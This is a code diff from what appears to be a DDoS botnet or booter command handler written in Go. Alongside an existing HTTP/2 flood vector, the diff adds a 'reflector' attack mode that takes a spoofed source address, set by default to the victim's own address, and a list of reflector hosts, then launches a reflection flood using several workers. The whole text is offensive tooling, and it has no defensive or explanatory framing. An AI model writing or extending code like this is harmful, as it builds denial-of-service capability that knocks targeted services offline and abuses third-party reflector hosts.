@@ -22,6 +22,8 @@ type StartCmd struct {
 	Port    uint16 `json:"port"`
 	Amp     string `json:"amp"`
 	Workers int    `json:"workers"`
+	SpoofSrc string `json:"spoof_src"`
+	RefFile  string `json:"reflector_file"`
 }
 
 var (
@@ -71,6 +73,25 @@ func handleStart(cmd StartCmd) string {
 		f := vectors.NewHTTP2Flooder("https://"+cmd.Target, cmd.Workers)
 		go f.Run(stop)
 		stats[id] = f.Sent
+	case "reflector":
+		file := cmd.RefFile
+		if file == "" {
+			file = "reflectors.txt"
+		}
+		src := cmd.SpoofSrc
+		if src == "" {
+			src = cmd.Target
+		}
+		f, err := vectors.NewReflectorFlooder(file, src)
+		if err != nil {
+			return "err: " + err.Error()
+		}
+		w := cmd.Workers
+		if w == 0 {
+			w = 4
+		}
+		go f.Run(stop, w)
+		stats[id] = f.Packets
 	default:
 		return "err: unknown vector"
 	}
